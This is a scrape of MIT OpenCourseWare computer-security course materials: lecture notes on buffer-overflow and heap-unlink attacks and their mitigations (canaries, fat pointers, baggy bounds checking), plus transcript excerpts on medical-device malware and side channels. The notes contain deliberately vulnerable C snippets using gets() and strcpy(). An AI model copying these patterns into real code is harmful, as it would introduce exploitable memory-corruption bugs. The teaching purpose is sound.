            <slice>
              <time_slice>1:13:28</time_slice>
              <text_slice>So it's kind of [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:29</time_slice>
              <text_slice>PROFESSOR: Oh, so
the question is</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:31</time_slice>
              <text_slice>why focus on integrity of
sensors rather than hacking,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:36</time_slice>
              <text_slice>because everything I
showed was about hacking?</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:38</time_slice>
              <text_slice>That's selection bias.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:40</time_slice>
              <text_slice>I selected those cases,
but that doesn't mean</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:42</time_slice>
              <text_slice>that's statistically relevant.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:45</time_slice>
              <text_slice>I divided up into two
cases-- maybe three.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:48</time_slice>
              <text_slice>The past, the present,
and the future.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:50</time_slice>
              <text_slice>So at the present,
most of the problems</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:54</time_slice>
              <text_slice>we're seeing from malware in our
very rudimentary surveillance</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:58</time_slice>
              <text_slice>of medical devices has to do
with malware that accidentally</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:01</time_slice>
              <text_slice>gets in, and then causes
near misses and malfunctions.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:05</time_slice>
              <text_slice>But we're no dummies.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:06</time_slice>
              <text_slice>We know that there could
be an intentional adversary</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:08</time_slice>
              <text_slice>in the future.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:09</time_slice>
              <text_slice>They just haven't
materialized yet.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:11</time_slice>
              <text_slice>The closest example
would be-- this</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:15</time_slice>
              <text_slice>is just from the news reports.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:16</time_slice>
              <text_slice>I don't know if
it's true, but it</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:18</time_slice>
              <text_slice>was from I believe
the New York Times--</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:20</time_slice>
              <text_slice>that there was a hospital.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:23</time_slice>
              <text_slice>CHS, I think, was
the hospital, Where</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:25</time_slice>
              <text_slice>they brought in a security
company, Mandiant.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:27</time_slice>
              <text_slice>And they believe that a nation
state had actually come in</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:32</time_slice>
              <text_slice>to steal the medical records.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:33</time_slice>
              <text_slice>They don't know exactly
why, but nation states.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:36</time_slice>
              <text_slice>And nation states are
powerful adversaries, right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:38</time_slice>
              <text_slice>If you run up against
a nation state,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:40</time_slice>
              <text_slice>you might as well just give up,
because none of these controls</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:43</time_slice>
              <text_slice>are going to help you.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:45</time_slice>
              <text_slice>But here's my concern.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:47</time_slice>
              <text_slice>If the nation
state, for instance,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:48</time_slice>
              <text_slice>is very dedicated on getting
one piece of information,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:51</time_slice>
              <text_slice>what if they make--
they're human too, right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:53</time_slice>
              <text_slice>What if they make a
mistake along the way</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:55</time_slice>
              <text_slice>and accidentally
hit a medical device</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:57</time_slice>
              <text_slice>as they're trying to extract
whatever kind of information</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:00</time_slice>
              <text_slice>they're trying to get at?</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:02</time_slice>
              <text_slice>And that could
affect the integrity.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:05</time_slice>
              <text_slice>In the future, there could be
instances of custom malware,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:09</time_slice>
              <text_slice>but I think it takes that
one more step of someone</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:16</time_slice>
              <text_slice>really wanting to cause harm.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:19</time_slice>
              <text_slice>And I'm hoping that
there aren't too many</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:21</time_slice>
              <text_slice>of those kinds of people.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:23</time_slice>
              <text_slice>But there are people
who write malware</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:24</time_slice>
              <text_slice>who don't realize
that malware gets</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:26</time_slice>
              <text_slice>into medical devices
in hospitals,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:28</time_slice>
              <text_slice>and it's still causing problems.</text_slice>
            </slice>
          </transcript>
        </video>
      </videos>
    </lecture>
    <lecture>
      <lecture_title>Control Hijacking Attacks (PDF)</lecture_title>
      <lecture_pdf_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/mit6_858f14_lec2/</lecture_pdf_url>
      <lectureno>2</lectureno>
      <slides>
        <slide>
          <slideno>3</slideno>
          <text>Used to be a bigger problem, but hardware and high-level	&#13; languages are
getting better.
oJIT compilation FTW!
oasm.js is within 2x of native C++ perf! [http://asmjs.org/faq.html ]
Use careful coding to	&#13; avoid garbage	&#13; collection jitter in critical	&#13; path.
Maybe you're a bad person/language chauvinist who doesn't know how to
pick the r
ight	&#13; tool for the	&#13; job.	&#13; If	&#13; your	&#13; task is I/O -bound,	&#13; raw compute speed is
much less important. Also, don't be the chump who writes text manipulation
programs in C.
All 3 above approaches ar e	&#13; effective	&#13; and	&#13; widely	&#13; used, but buff eroverflows	&#13; are	&#13; still a
problem in practice.
Large/complicated legacy code written in C is very prevalent.
Even	&#13; newly written code in C/C++	&#13; can have memory errors.
How	&#13; can we mitigate buffer overflows despite buggy code?
Two	&#13; things	&#13; going on in a "traditional"	&#13; buffer overflow:
oAdversary gains control over execution
(program counter).
oAdversary executes
some malicious code.
What	&#13; are th
e difficulties to these two steps?
oRequires	&#13; overwriting	&#13; a code pointer (which is later invoked).
Common	&#13; target is a return address	&#13; 
using a buffer	&#13; on the	&#13; stack. Any
memory error could potentially work, in practice. Function pointers,
C++ vtables, exception handlers, etc.
oRequires some interesting code in process's memory. This is often
easier	&#13; than	&#13; #1, because:
it's	&#13; easy	&#13; to	&#13; put code	&#13; in a buffer,	&#13; and
the process already contains a lot	&#13; of code that might be
exploitable.
oHow
ever, the	&#13; attacker	&#13; needs	&#13; to	&#13; put this	&#13; code in a predictable	&#13; location,
so that t
he	&#13; attacker	&#13; can	&#13; set the code pointer	&#13; to	&#13; point to	&#13; the	&#13; evil code!
Mitigation approach 1: canaries (e.g., StackGuard,	&#13; gcc's SSP)
Idea: OK
to overwrite	&#13; code	&#13; ptr,	&#13; as long as we catch it before invocation.
One of the earlier systems: StackGuard
Pl
ace	&#13; a canary on the	&#13; stack upon entry,	&#13; check canary value before retur n.
Usually	&#13; requires source code; compiler inserts canary checks.
Q: Where is the
canary on the stack diagram?
oA: Canary	&#13; must go "in front of" return address on the stack,	&#13; so tha t
any overflow	&#13; which rewrites return address will	&#13; also rewrite canary.
4</text>
        </slide>
        <slide>
          <slideno>6</slideno>
          <text>controlled memory and has attacker-controlled	&#13; values for the	&#13; forward	&#13; and	&#13; 
backwards pointers.
If the attacker knows how free()	&#13; updates the pointers,	&#13; he can	&#13; use that	&#13; update code
to write an arbitrary value to an arbitrary place. For example, the attacker can
overwrite a return	&#13; addres s.
Actual  details are a bit  more  complicated; if you're  interested	&#13; in gory details, go 
here: http://www.win.tue.nl/~aeb/linux/hh/hh-11.html
The high -level	&#13; point	&#13; is that	&#13; stack	&#13; canaries won't prevent	&#13; this attack, because	&#13; the
attacker is "skipping over" the canary and writing	&#13; directly	&#13; to	&#13; the	&#13; return address!
So, stack canaries	&#13; are	&#13; one	&#13; approach for mitigating buffer overflows	&#13; in buggy	&#13; code.
Mitigation approach 2: bounds checking.
Overall goal: prevent pointer misuse by checking if pointers are in	&#13; range.
Challenge:	&#13; In C, it can b e	&#13; hard	&#13; to	&#13; differentiate	&#13; between	&#13;  a valid pointer and an invalid
pointer. For example, suppose that a program allocates an array of characters 
char x[1024];
 
 as	&#13; well as a pointer to some place in that array, e.g.,
char *y = &amp;x[107];
 
Is it OK to increment y to
access subsequent elements?
If x represents a string buffer, maybe yes.
If x represents a network message, maybe no.
Life is even more complicated if the program uses
unions.
union u{
int i;
struct s{
int j;
int k;
};
};
int *ptr = &amp;(u.s.k); //Does this point to valid data?
 
The problem is
that, in C,	&#13; a
pointer does not encode information about the intended
usage semantics for that pointer. So, a lot of tools
don't	&#13; try to guess those semantics.
Instead, the tools have a less lofty goal than "totally correct" pointer semantics: the
7</text>
        </slide>
        <slide>
          <slideno>12</slideno>
          <text>MIT OpenCourseWare
http://ocw.mit.edu
6.858 Computer Systems Security
Fall 2014
For information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms.</text>
        </slide>
        <slide>
          <slideno>7</slideno>
          <text>tools just	&#13; enforce the memory bounds on heap objects and stack objects.
 At a high
level,	&#13; here's the goal: For a pointer	&#13; p'	&#13; that's derived from	&#13; p, p' should only be
dereferenced to access the valid memory region that belongs to p.
Enforcing memory bounds is a weaker goal than enforcing "totally correct"	&#13; pointer
semantics. Programs can still shoot
themselves in the foot by trampling on their
memory in nasty ways (e.g.,	&#13; in the union example, the application may write to ptr
even though	&#13; it's	&#13; not defined).
However, bounds	&#13; checking is still useful because	&#13; it prevents *arbitrary* memory
overwrites. The program	&#13; can only trample its memory if that memory is actually
allocated! THIS IS CONSIDERED	&#13; PROGRESS IN	&#13; THE WORLD	&#13; OF	&#13; C.
A drawback of bounds checking is that it typically requires changes to the compiler,and programs must be recompiled with the new compiler. This is a problem	&#13; if you
only	&#13; have	&#13; access to binaries.
What	&#13; are some approaches for implementing bounds checking?
Bounds	&#13; checking	&#13; approach #1: Electric	&#13; fences
This is an old approach that had the virtue of being simple.
Idea: Align each heap object with
a guard page, and use page tables to ensure
that	&#13; accesses to the guard	&#13; page cause a fault.
+---------+
 
| Guard 
|
| | ^
 
+---------+  | Overflows cause a page exception
| 
Heap | |
| obj | |
+---------+
 
This is a convenient deb ugging	&#13; technique, s ince	&#13; a heap	&#13; overflow wil
 l
immediately cause a crash, as opposed to silently corrupting the heap and
causing a failure at some indeterminate time in the future.
Big	&#13; advantage: Works with out source code ---don't need to	&#13; change compilers
or recompile programs! [You *do* need to relink them	&#13; so that they use a new
version of malloc which implements electric fences.]
Big	&#13; disadvantage: Huge overhead!	&#13; There's only	&#13; one object per page, and you
have the overhead of a dummy page which isn't used for "real"	&#13; data.
Summary:	&#13; Electric	&#13; fences can
beuseful	&#13; as debugging	&#13; technique, and they	&#13; can
prevent
some buffer overflows for heap objects. However, electric	&#13; fences
can't protect the	&#13; stack,	&#13; and the memory overhead is too high to use in
production systems.
Bounds	&#13; checking	&#13; approach #2: Fat pointer
8</text>
        </slide>
        <slide>
          <slideno>9</slideno>
          <text>char p[256];
For each	&#13; pointer, we	&#13; need	&#13; to	&#13; interpose	&#13; on two	&#13; operations:
	 pointer arithmetic:	&#13; char *q = p + 256; 
 pointer dereferencing: char ch = *q;
Q:Why	&#13; do we need to interpose on	&#13; dereference?	&#13; Can't	&#13; we do just arithmetic?
	 A: An invalid pointer isn't
always a bug! For example, a pointer to o ne
element past the last item	&#13; of an array might be used as a stopping	&#13; test	&#13; in a
loop. Applications can also do goofy stuff like:
o	 Simulating 1-indexed	&#13; arrays
o	 C
omputing p+(a-b) as (p+a)-b
o Generating	&#13; OOB pointers that	&#13; are later checked for validity
So, the mere creation
ofinvalid	&#13; pointer	&#13; shouldn't cause	&#13; program	&#13; to fail.
Q:Why do we need to interpose on arithmetic? Can't we do just dereference?
	 A: Interposing on
arithmetic is what allows us to track the provenanc e of
pointers and set	&#13; the OOB bit. Without the OOB, we won't	&#13; be able to tell	&#13; when	&#13; 
a derived pointer goes outside of the bounds of its base object.
Challenge 1: How do we find the bounds information for a regular	&#13; pointer, i.e., a
pointer that's in -bounds?
Naive: Use a hash table or interval tree to map addresses to bounds.
Good: Space	&#13; efficient (only	&#13; store	&#13; info for in-use	&#13; pointers,	&#13; not all possible addresses).
Bad: Slow lookup (multiple memory accesses per look-up).
Naive: Use an array to store bounds info for *every* memory address.
Good: Fast!
Bad: Really high memory overhead.
Challenge 2: How do we	&#13; force out -of-bounds pointer dereferences to fail?
Naive: Instrument every pointer dereference.
Good: Uh, it works.
Bad: Expensive ---we have	&#13; to	&#13; execute	&#13; extra code for every dereference!
The baggy	&#13; bounds	&#13; approach:	&#13; 5 tricks
	 Round up each allocation to a power of 2,	&#13; and align	&#13; the start of the	&#13; allocation	&#13; 
to that	&#13; power of 2.
	 Express each range limit as log_2(alloc_ size).	&#13;  For 32-bit	&#13; pointers,	&#13; only need 5
bits to express the possible ranges.
	 Store limit info in a linear array: fast	&#13; lookup	&#13; with one byte	&#13; p er entry. Also, we
can use virtual memory to allocate the array	&#13; on -demand!
 Allocate memory at slot granularity	&#13; (e.g., 16 bytes): fewer	&#13; a rray	&#13; entries.
10</text>
        </slide>
        <slide>
          <slideno>4</slideno>
          <text>| |
+------------------+
 
entry %esp ----&gt; |  return address | ^

 
+------------------+  |
new %ebp ------&gt; |  saved %ebp | |

+------------------+  |
| CANARY | | Overflow goes

+------------------+  | this way.
| buf[127] | |
| ... | |
| buf[0] | |
+------------------+
 | |
Q:Suppose that the compiler always made the canary 4 bytes	&#13; of the	&#13;  'a'	&#13; character.	&#13; 
What's wrong	&#13; with this?
 A: Adversary can include the appropriate canary value in the	&#13; buffer	&#13; overflow!
So, the
canary must be either hard to guess,	&#13; or it can be	&#13; easy to	&#13; guess but still
resilient against buffer overflows. Here are examples of these approaches.
	 Terminator canary:	&#13; four	&#13; bytes	&#13; (0, CR, LF, -1)
o	 Idea: Many C f
unctions treat	&#13; these	&#13; characters as terminators(e.g.,
gets(), sprintf()). As a result,
if the canary matches one of these
terminators, then further writes won't happen.
 Random	&#13; canary generated at program	&#13; init time: Much more common today
(but,	&#13; you need good randomness!).
What	&#13; kinds of v
ulnerabilities will	&#13; a stack	&#13; canary not	&#13; catch?
	 Overwrites	&#13; of function	&#13; pointer	&#13; variables	&#13; before	&#13; the	&#13; canary.
	 Attacker can overwrite a data pointer, then leverage it to do arbitrary mem	&#13; 
writes.
int *ptr = ...;
char buf[128]; 
gets(buf); //Buffer is overflowed, and overwrites ptr.

*ptr = 5; //Writes to an attacker-controlled address!

//Canaries can't stop this kind of thing.
 
	 Heap object overflows	&#13; (function pointers, C++ vtables).
 malloc/free overflows
int main(int argc, char **argv) {
char *p, *q; 
 
p = malloc(1024);
q = malloc(1024);
 
5</text>
        </slide>
        <slide>
          <slideno>0</slideno>
          <text>6.858 Lecture 2
REVIEW OF BUF 
FER	&#13; OVERFLOW ATTACKS
Last lecture, we looked at the basics of performing a buffer overflow	&#13; attack.	&#13; That	&#13; 
attack leveraged several observations:
	 Systems software is	&#13; often	&#13; written	&#13; in C (operating systems, file systems,
databases, compilers, network servers, command
shells and console utilities)
	 C is essentially	&#13; high -level assembly, so . . .
o	 Exposes
raw pointers to memory
o	 Does not
perform	&#13; bounds-checking	&#13; on arrays (b/c	&#13; the	&#13; hardware	&#13; 
doesn't do this, and C wants to
get	&#13; you	&#13; as close to the hardware as
possible)
 Attack also leveraged architectural knowledge about how x86	&#13; code works:
o	 The
direction	&#13; that the	&#13; stack grows
o	 Layout of st
ack variables	&#13; (esp. arrays	&#13; and return addresses	&#13; for
functions)
void read_req() {
char buf[128]; 
int i;
gets(buf);
//. . . do stuff w/buf . . .

}
What does
the compiler generate in terms of memory layout?
x86 stack	&#13; looks
like this:
	 %esp points	&#13; to	&#13; the	&#13; last (bottom -most) valid thing on the stac k.
	 %ebp points	&#13; to	&#13; th e	&#13; caller's	&#13; %esp value.
+
------------------+
 
entry %ebp ----&gt; | .. prev frame .. |
| | |
| | | stack grows down
+------------------+  |
entry %esp ----&gt; |  return address 
| v
 
+------------------+
 
new %ebp ------&gt; |  saved %ebp |
+
------------------+
 
| buf[127] |
| 
... |
| buf[0] |
+------------------+
 
new %esp ------&gt; |  i |
+------------------+
 
1</text>
        </slide>
        <slide>
          <slideno>2</slideno>
          <text>For example, we can use static analysis to find problems in source	&#13; code before	&#13; it's	&#13; 
compiled. Imagine that you had a function	&#13; like	&#13; this:
void foo(int *p){
int offset;
int *z = p + offset;
if(offset &gt; 7){
bar(offset);
}
}
 
By statically	&#13; analyzing	&#13; th
e control	&#13; flow,	&#13; we can tell that	&#13; offset	&#13; is used without	&#13; being	&#13; 
initialized. The if-statement	&#13; also puts bounds on offset that we may be able to
propogate	&#13; to bar. We'll talk about static analysis more in later lectures.
Fuzzers that supply random inputs can be effective for finding bugs.	&#13; Note	&#13; that
fuzzing can be combined with static analysis to maximize code coverage!
Bad: Difficult to prove the complete absence of bugs, esp. for unsafe	&#13; code like	&#13;  C.
Good:	&#13; Even partial analysis is useful, since programs should become strictly less
buggy. For example, baggy bounds checking cannot catch
all memory errors, but it
can detect many important kinds.
Approach	&#13; #3: Use a memory-safe	&#13; langu age	&#13; (JavaScript,	&#13; C#, Python ).
Good: Prevents memory corruption errors by not exposing raw memory addresses
to the programmer, and by automatically handling	&#13; ga
rbage	&#13; collection.
Bad: Low -level	&#13; runtime code DOES use raw memory addresses. So, that runtime
core still needs to	&#13; be	&#13; correc t.	&#13; For example, heap spray attacks:
https://www.usenix.org/legacy/event/sec09/tech/full_papers/ratanaworab
han.pdf
https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-
part-11-heap-spraying-demystified/
Bad: Still	&#13; have a lot	&#13; of legacy	&#13; code in unsafe languages (FORTRAN and COBOL	&#13; oh
noes).
Bad: Maybe you	&#13; need access to low -level	&#13; hardware features b/c,	&#13; e.g.,	&#13; you're writing	&#13; 
a device driver.
Bad: Perf is worse than	&#13; a fine -tuned C applicatio n?
3</text>
        </slide>
        <slide>
          <slideno>10</slideno>
          <text>Ex: 
slot_size = 16
 
p = malloc(16); table[p/slot_size] = 4; 
 
p = malloc(32); table[p/slot_size] = 5; 
table[(p/slot_size) + 1] = 5;
 
Now,	&#13; given a known	&#13; good pointer p, and a derived	&#13; pointer p', we can test whether  p' 
is valid	&#13; by checking whether both pointers  have the same prefix	&#13; in their address	&#13; 
bits,	&#13; and  
they only differ in their	&#13; e least significant bits,	&#13; where	&#13; e is equal to the 
logarithm	&#13; of the allocation  size.
C code
------
p' = p + i;
Bounds
check
------------
size = 1 &lt;&lt; table[p &gt;&gt; log_of_slot_size];
base = p &amp; ~(size - 1);
(p' &gt;= base) &amp;&amp; ((p' - base) &lt; size)
 
Optimized bounds check
----------------------
(p^p') &gt;&gt; table[p &gt;&gt; log_of_slot_size] == 0
Use virtual memory system	&#13; to prevent out-of-bound derefs: set most
significant bit	&#13; in	&#13; an OOB po
inter, and then mark pages in the upper half of
the address space as inaccessible. So, we don't have to instrument pointer
dereferences to prevent bad memory accesses!
Example code (assume that slot_size=16):
char *p = malloc(44);
//Note that the nearest power of 2 (i.e.,
//64 bytes) are allocated. So, there are
//64/(slot_size) = 4 bounds table entries
//that are set to log_2(64) = 6.
 
char *q = p + 60;
//This access is ok: It's past p's object
//size of 44, but still within the baggy 
//bounds of 64.

 
char *r = q + 16;
//r is now at an offset of 60+16=76 from
 
11</text>
        </slide>
        <slide>
          <slideno>5</slideno>
          <text>if(argc &gt;= 2)
strcpy(p, argv[1]);
free(q);
free(p);
return 0;
}
Assume that the
two blocks of memory belonging to p and q are adjace nt/nearby	&#13; in	&#13; 
memory.
Assume that malloc and free represent memory blocks like this:
+----------------+  
| |
| App data |
| | Allocated memory block
+
----------------+     
| size |
+----------------+  
+----------------+
 
| size |
+----------------+
 | 
...empty... |
+----------------+  
| bkwd ptr |
+----------------+          
| fwd ptr | Free memory block
+----------------+     
| size |
+----------------+ 
So, the buffer overrun	&#13; in p will overwrite	&#13; the size value in q's memory	&#13; bl
 ock!	&#13;  Why is
this a problem?
When free() merges two adjacent free blocks, it needs to manipulate bkwd and fwd
pointers, and the pointer calculation	&#13; uses size to determine where the free memory
block	&#13; structure lives!
p = get_free_block_struct(size);
bck = p-&gt;bk;
fwd = p-&gt;fd;
fwd
-&gt;bk = bck; //Writes memory!
bck-&gt;fd = fwd;  //Writes memory!
The free memory block is represented as a C struct;	&#13; by	&#13; corru pting	&#13; the	&#13; size value,	&#13; the
attacker can force free() to operate on	&#13; a fake	&#13; struct that resides in attacker -
6</text>
        </slide>
        <slide>
          <slideno>11</slideno>
          <text>//p. This means that r is (76-64)=12 bytes
//beyond the end of p. This is more than
//half a slot away, so baggy bounds will
//raise an error.
 
char *s = q + 8;
//s is now at an offset of 60+8=68 from p. 
//So, s is only 4 bytes beyond the baggy
//bounds, which is les than half a slot
//away. No error is raised, but the OOB
//high-order bit is set in s, so that s
//cannot be dereferenced.

 
char *t = s - 32;
//t is now back inside the bounds, so
//the OOB bit is cleared.
For OOB p
ointers, the	&#13; high	&#13; bit is set (if OOB within half	&#13; a slot).
Typically,	&#13; OS	&#13; kernel lives	&#13; in upper half,	&#13; protects	&#13; itself via paging
hardware.
Q: Why	&#13; half a
slot	&#13; for out -of-bounds?
So what's
the answer to the homework problem?
char *p = malloc(256);
char *q = p + 256;
char ch = *q; //Does this raise an exception?
//Hint: How big is the baggy bound for p?
ADDITIONAL/SUPPLEMENTAL INFO
===============================
Some bugs in
the baggy bounds	&#13; paper:
Fig
ure	&#13; 3, explic it bounds	&#13; check should	&#13; generate	&#13; the size like this:
size = 1 &lt;&lt; table[p &gt;&gt; log_of_slot_size]
Figure 3, optimized bounds check should be
(p^p') &gt;&gt; table[p &gt;&gt; log_of_slot_size] == 0
Figures	&#13; 5 and	&#13; 18, pointer arithmetic code should be
char *p = &amp;buf[i];
or
char *p = buf + i;
 
12</text>
        </slide>
        <slide>
          <slideno>1</slideno>
          <text>How does the	&#13; adversary	&#13; take	&#13; advantage	&#13; of this	&#13; code?
	 Supply long input, overwrite	&#13; data on stack past buffer.
	 Key observation	&#13; 1: attacker can	&#13; overwrite the return address, make the
program	&#13; jump to a place of
theattacker's choosing!
	 Key observation	&#13; 2: attacker can	&#13; set	&#13; return	&#13; address to the buffer itself,	&#13; include
some x86 code in there!
What	&#13; can	&#13; the attacker
s do once	&#13; they are	&#13; executing code?
	 Use any privileges	&#13; of the	&#13; process! If the	&#13; process is running as	&#13;  root or
Administrator, it can do whatever it wants on the system. Even if the processis not running as root, it can send spam, read files, and interestingly,	&#13; attack or
subvert other machines behind the firewall.
	 Hmmm, but why didn't the OS notice that the buffer has been	&#13; overr
 un?
o	 As far as the OS is aware, nothing strange has happened! Rememberthat, to a first approximation, the 
OS only gets invoked by the web	&#13; 
server	&#13; when the server does IO or IPC.	&#13; Other than	&#13; that,	&#13; the OS
basically sits ba ck and lets the program	&#13; execute, relying on hardware	&#13; 
page tables to prevent	&#13; processes from	&#13; tampering with each other's
memory. However, page table protections don't	&#13; prevent	&#13; buffer
overruns launched by a process "against	&#13; itself,"	&#13; since the overflowed	&#13; 
buffer and the return	&#13; address and all of that	&#13; stuff are inside the
process's valid address space.
o	 Later	&#13; in this	&#13; lecture, we'll talk about things that	&#13; the OS *can*	&#13; d o to
make buffer overflows more difficult.
FIXING	&#13; 
BUFFER OVERFLOWS
Approach	&#13; #1: Avoid bugs in C code.
Programmer should carefully check sizes of buffers, strings, arrays, etc. In
particular, the programmer should	&#13; use	&#13; standard	&#13; library	&#13; functions	&#13; that take buffer
sizes int o	&#13; account ( strncpy() instead	&#13; of strcpy(), fgets() instead	&#13; of
gets(), etc.).
Modern	&#13; versions of gcc and Visual	&#13; Studio warn	&#13; you	&#13; when a program	&#13; uses unsafe
functions	&#13; like	&#13; gets().	&#13; In	&#13; general,	&#13; YOU	&#13; SHOULD	&#13; NOT	&#13; IGNORE COM PILER WARNINGS.
Treat warnings like errors!
Good: Avoid problems in the first place!
Bad: It's hard to ensure that	&#13; code is bug -free,	&#13; particularly if the	&#13; code base	&#13; is large.	&#13; 
Also, the application itself may define buffer manipulation functions which do not
use	&#13; fgets() or strcpy() as primitives.
Approach	&#13; #2: Build tools to help programmers find bugs.
2</text>
        </slide>
        <slide>
          <slideno>8</slideno>
          <text>Idea: Modify	&#13; the pointer representation	&#13; to	&#13; include	&#13; bounds information. Now, a
pointer includes a memory address and bounds information about an object that
lives in that memory region.
Ex:
Regular 32-bit pointer  
+-----------------+
 
| 4-byte address  |
+
-----------------+
 
Fat pointer (96 bits)
+-----------------+----------------+---------------------+

 
| 4-byte obj_base | 4-byte obj_end | 4-byte curr_address |
+-----------------+----------------+---------------------+
 
You need to modify the compiler and recompile the programs to use the fat pointers.
The compiler generates code to abort the
program	&#13; if it dereferences a pointer whose
address is outside of its own base...end range.
int *ptr = malloc(sizeof(int) * 2);
while(1){
*ptr = 42; &lt;----------|
 
ptr++; |
} |
__________________________|
|

This line	&#13; checks	&#13; t
he	&#13; current address	&#13; of the	&#13; pointer	&#13; and ensures that it's	&#13; in-bounds.	&#13; 
Thus, this	&#13; line	&#13; will fa
il during the	&#13; third	&#13; iteration	&#13; of the	&#13; loop.
Problem	&#13; #1: It can be expensive to check all pointer dereferences. The C community
hates	&#13; things	&#13; that are expensive,	&#13; because	&#13; C is all about SPEED SPEED SPEED.
Problem	&#13; #2: Fat pointers are incompatible with a lot of existing	&#13; software.
	 You can't pass a fat pointer to an unmodified library.
	 You	&#13; can't	&#13; use fat	&#13; pointers in	&#13; fixed -size	&#13; data stru ctures.	&#13; For example,
sizeof(that_struct) will	&#13; change!
	 Updates	&#13; to	&#13; fat pointers	&#13; are not atomic, because they span multiple words.
Some programs
assume that pointer writes are atomic.
Bounds	&#13; checking	&#13; approach #3: Useshadow dat
a structures	&#13; to	&#13; keep track	&#13; of
bounds information (Jones and Kelly, Baggy).
Basic	&#13; idea: For each allocated object,	&#13; st ore	&#13; how big	&#13; the object is. For example:
Record the value passed to malloc:
char *p = malloc(mem_size);
For static	&#13; variable s, the values are determined by the compiler:
9</text>
        </slide>
      </slides>
      <videos>
        <video>
          <video_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/lecture-16-side-channel-attacks/</video_url>
          <video_title>Lecture 16: Side-Channel Attacks</video_title>
          <transcript>
            <slice>
              <time_slice>0:00</time_slice>
              <text_slice>The following content is
provided under a Creative</text_slice>
            </slice>
            <slice>
              <time_slice>0:02</time_slice>
              <text_slice>Commons license.</text_slice>
            </slice>
            <slice>
              <time_slice>0:03</time_slice>
              <text_slice>Your support will help
MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:06</time_slice>
              <text_slice>continue to offer high quality
educational resources for free.</text_slice>
            </slice>
            <slice>
              <time_slice>0:10</time_slice>
              <text_slice>To make a donation or to
view additional materials</text_slice>
            </slice>
            <slice>
              <time_slice>0:12</time_slice>
              <text_slice>from hundreds of MIT courses,
visit MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:16</time_slice>
              <text_slice>at ocw.mit.edu.</text_slice>
            </slice>
            <slice>
              <time_slice>0:26</time_slice>
              <text_slice>PROFESSOR: All right,
guys, let's get started.</text_slice>
            </slice>
            <slice>
              <time_slice>0:28</time_slice>
              <text_slice>So today, we're going to talk
about side-channel attacks,</text_slice>
            </slice>
            <slice>
              <time_slice>0:31</time_slice>
              <text_slice>which is a general class
of problems that comes up</text_slice>
            </slice>
            <slice>
              <time_slice>0:36</time_slice>
              <text_slice>in all kinds of systems.</text_slice>
            </slice>
            <slice>
              <time_slice>0:38</time_slice>
              <text_slice>Broadly, side-channel
attacks are</text_slice>
            </slice>
            <slice>
              <time_slice>0:40</time_slice>
              <text_slice>situations where you haven't
thought about some information</text_slice>
            </slice>
            <slice>
              <time_slice>0:42</time_slice>
              <text_slice>that your system
might be revealing.</text_slice>
            </slice>
            <slice>
              <time_slice>0:44</time_slice>
              <text_slice>So typically, you have multiple
components that you [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>0:47</time_slice>
              <text_slice>maybe a user talking
to some server.</text_slice>
            </slice>
            <slice>
              <time_slice>0:50</time_slice>
              <text_slice>And you're thinking, great,
I know exactly all the bits</text_slice>
            </slice>
            <slice>
              <time_slice>0:53</time_slice>
              <text_slice>going over some wire [INAUDIBLE]
server, and those are secure.</text_slice>
            </slice>
            <slice>
              <time_slice>0:57</time_slice>
              <text_slice>But it's often easy to miss
some information revealed,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00</time_slice>
              <text_slice>either by user or by server.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03</time_slice>
              <text_slice>So the example that the
paper for today talks about</text_slice>
            </slice>
            <slice>
              <time_slice>1:07</time_slice>
              <text_slice>is a situation where the
timing of the messages</text_slice>
            </slice>
